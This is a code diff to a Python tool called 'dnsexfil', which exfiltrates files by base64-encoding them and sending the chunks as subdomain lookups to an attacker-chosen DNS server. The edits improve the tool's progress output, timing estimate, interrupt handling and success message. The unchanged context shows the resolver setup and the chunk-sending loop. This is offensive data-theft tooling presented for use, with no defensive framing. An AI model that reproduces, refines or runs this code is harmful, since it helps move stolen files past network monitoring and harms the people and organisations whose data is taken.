@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import dns.resolver
 import base64
 import socket
@@ -6,6 +8,7 @@ import time
 import os
 import sys
 from os.path import exists
+from datetime import datetime
 
 # argparse for argument parsing
 parser = argparse.ArgumentParser(prog='dnsexfil', usage='%(prog)s [options]', description='Simple tool for data exfiltration through DNS requests')
@@ -43,9 +46,12 @@ chunks = len(splitted)
 # Instanciate new resolver
 resolver = dns.resolver.Resolver()
 resolver.nameservers = [server]
-print("Instanciated new resolver on " + server)
-print("Chunks: " + str(chunks))
-print("Estimated Time: " + " (about " + str(5*chunks) + " seconds)")
+print("----------------------------------------------")
+print("+ DNS Resolver:   " + server)
+print("+ Chunks to Send: " + str(chunks))
+print("+ Estimated Time: " + "about " + str((timeout + 2)*chunks) + " seconds")
+print("+ Starting Time:  " + datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
+print("----------------------------------------------")
 
 # for every chunk, ask the server for resolution of <chunk>.<domain> as if <chunk> were the third level domain of the main one
 for chunk in splitted:
@@ -61,5 +67,12 @@ for chunk in splitted:
 		#			print(j.address)
 	except dns.exception.Timeout as e1:
 		print("TIMEOUT")
+	except KeyboardInterrupt as e:
+		print()
+		print("----------------------------------------------")
+		sys.exit("Terminating exfiltration")
 	except Exception as e2:
 		pass
+
+print("----------------------------------------------")
+print("File " + file + " succesfully sent")
